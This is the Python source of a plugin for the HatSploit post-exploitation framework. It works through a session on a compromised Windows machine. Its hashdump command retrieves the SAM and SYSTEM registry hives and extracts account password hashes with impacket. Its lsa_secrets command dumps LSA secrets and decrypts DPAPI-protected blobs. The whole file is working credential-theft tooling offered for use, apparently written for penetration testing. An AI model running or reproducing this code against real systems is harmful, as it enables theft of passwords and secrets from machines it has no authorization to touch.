"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os
import tempfile

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from pex.proto.tlv import TLVPacket

from hatsploit.lib.core.plugin import Plugin


CRED_HASHDUMP = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
CRED_LSA_SECRETS = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
CRED_DPAPI_DECRYPT = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

TLV_TYPE_HASH_SAM = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
TLV_TYPE_HASH_SYSTEM = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 1)

LSA_SECRETS_TYPE_NAME = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
LSA_SECRETS_TYPE_DATA = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
LSA_DPAPI_TYPE_INPUT = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 1)
LSA_DPAPI_TYPE_OUTPUT = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 2)
LSA_DPAPI_TYPE_ENTROPY = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 3)


def extract_bootkey_from_hive(system_data):
    """ Extract the boot key from raw SYSTEM hive data. """

    try:
        from impacket.winregistry import Registry
    except ImportError:
        return None

    tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.sys')
    tmp.write(system_data)
    tmp.close()

    try:
        reg = Registry(tmp.name, isRemote=False)
        boot_key = reg.getBootKey()
        reg.close()
        return boot_key
    except Exception:
        return None
    finally:
        os.unlink(tmp.name)


def extract_hashes_from_sam(sam_data, boot_key):
    """ Extract user hashes from SAM hive using the boot key. """

    try:
        from impacket.winregistry import Registry
        from impacket.secretsdump import SAMHashes
    except ImportError:
        return None

    sam_tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.sam')
    sam_tmp.write(sam_data)
    sam_tmp.close()

    results = []

    try:
        sam = SAMHashes(sam_tmp.name, boot_key, isRemote=False)
        sam.dump()
        for item in sam._SAMHashes__itemsFound.values():
            results.append(item)
        sam.finish()
    except Exception:
        pass
    finally:
        os.unlink(sam_tmp.name)

    return results


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Credentials Plugin",
            'Plugin': "credentials",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "Dump SAM hashes, LSA secrets, and decrypt DPAPI blobs."
            ),
        })

        self.commands = [
            Command({
                'Category': "credential",
                'Name': "hashdump",
                'Description': "Dump SAM password hashes (requires SYSTEM privileges).",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-d', '--dump'),
                        {
                            'help': "Dump password hashes.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-r', '--raw'),
                        {
                            'help': "Save raw SAM and SYSTEM hives to directory.",
                            'metavar': 'DIR',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "credential",
                'Name': "lsa_secrets",
                'Description': "Dump LSA secrets or decrypt DPAPI blobs.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-d', '--dump'),
                        {
                            'help': "Dump all LSA secrets.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-D', '--dpapi'),
                        {
                            'help': "Decrypt a DPAPI blob file.",
                            'metavar': 'FILE',
                        }
                    ),
                    (
                        ('-e', '--entropy'),
                        {
                            'help': "Optional entropy file for DPAPI decryption.",
                            'metavar': 'FILE',
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Save decrypted output to file.",
                            'metavar': 'FILE',
                        }
                    ),
                ]
            }),
        ]

    def hashdump(self, args):
        if not args.dump and not args.raw:
            self.print_usage()
            return

        self.print_process("Dumping SAM and SYSTEM hives...")

        result = self.session.send_command(
            tag=CRED_HASHDUMP,
            plugin=self.plugin,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to dump hives! Need SYSTEM privileges.")
            return

        sam_data = result.get_raw(TLV_TYPE_HASH_SAM)
        sys_data = result.get_raw(TLV_TYPE_HASH_SYSTEM)

        if not sam_data or not sys_data:
            self.print_error("Failed to retrieve hive data!")
            return

        self.print_success(
            f"Retrieved SAM ({len(sam_data)} bytes) and "
            f"SYSTEM ({len(sys_data)} bytes) hives."
        )

        if args.raw:
            out_dir = args.raw
            os.makedirs(out_dir, exist_ok=True)

            sam_path = os.path.join(out_dir, 'SAM')
            sys_path = os.path.join(out_dir, 'SYSTEM')

            with open(sam_path, 'wb') as f:
                f.write(sam_data)
            with open(sys_path, 'wb') as f:
                f.write(sys_data)

            self.print_success(f"Saved SAM to {sam_path}")
            self.print_success(f"Saved SYSTEM to {sys_path}")

        if args.dump:
            try:
                boot_key = extract_bootkey_from_hive(sys_data)
                if boot_key is None:
                    self.print_error(
                        "Failed to extract boot key. "
                        "Install impacket: pip install impacket"
                    )
                    return

                hashes = extract_hashes_from_sam(sam_data, boot_key)
                if hashes is None:
                    self.print_error("Failed to extract hashes from SAM.")
                    return

                if not hashes:
                    self.print_warning("No user hashes found.")
                    return

                self.print_empty()
                for entry in hashes:
                    self.print_information(entry)
                self.print_empty()

            except Exception as e:
                self.print_error(f"Hash extraction failed: {e}")
                self.print_information(
                    "Use --raw to save hives and process offline with "
                    "secretsdump.py or samdump2."
                )

    def _dump_secrets(self):
        result = self.session.send_command(
            tag=CRED_LSA_SECRETS, plugin=self.plugin
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to dump LSA secrets (need SYSTEM?)!")
            return

        headers = ("Secret Name", "Data (hex)")
        data = []

        entry = result.get_tlv(TLV_TYPE_GROUP)
        while entry:
            name = entry.get_string(LSA_SECRETS_TYPE_NAME) or ''
            raw = entry.get_raw(LSA_SECRETS_TYPE_DATA)

            hex_data = raw.hex() if raw else "(empty)"
            if len(hex_data) > 128:
                hex_data = hex_data[:128] + "..."

            data.append((name, hex_data))
            entry = result.get_tlv(TLV_TYPE_GROUP)

        if not data:
            self.print_information("No secrets found.")
            return

        self.print_table("LSA Secrets", headers, *data)

    def _dpapi_decrypt(self, blob_file, entropy_file, out_file):
        try:
            with open(blob_file, 'rb') as f:
                blob_data = f.read()
        except (IOError, OSError) as e:
            self.print_error("Cannot read blob file: %s" % str(e))
            return

        tlv_args = {
            LSA_DPAPI_TYPE_INPUT: blob_data,
        }

        if entropy_file:
            try:
                with open(entropy_file, 'rb') as f:
                    tlv_args[LSA_DPAPI_TYPE_ENTROPY] = f.read()
            except (IOError, OSError) as e:
                self.print_error("Cannot read entropy file: %s" % str(e))
                return

        result = self.session.send_command(
            tag=CRED_DPAPI_DECRYPT,
            plugin=self.plugin,
            args=tlv_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("DPAPI decryption failed!")
            return

        decrypted = result.get_raw(LSA_DPAPI_TYPE_OUTPUT)
        if not decrypted:
            self.print_error("No decrypted data returned!")
            return

        if out_file:
            with open(out_file, 'wb') as f:
                f.write(decrypted)
            self.print_information("Decrypted data saved to %s (%d bytes)." % (
                out_file, len(decrypted)))
        else:
            self.print_information("Decrypted data (%d bytes):" % len(decrypted))
            try:
                text = decrypted.decode('utf-8', errors='replace')
                self.print_information(text)
            except Exception:
                self.print_information(decrypted.hex())

    def lsa_secrets(self, args):
        if args.dump:
            self._dump_secrets()
        elif args.dpapi:
            self._dpapi_decrypt(args.dpapi, args.entropy, args.output)
        else:
            self.print_usage()

    def load(self):
        pass
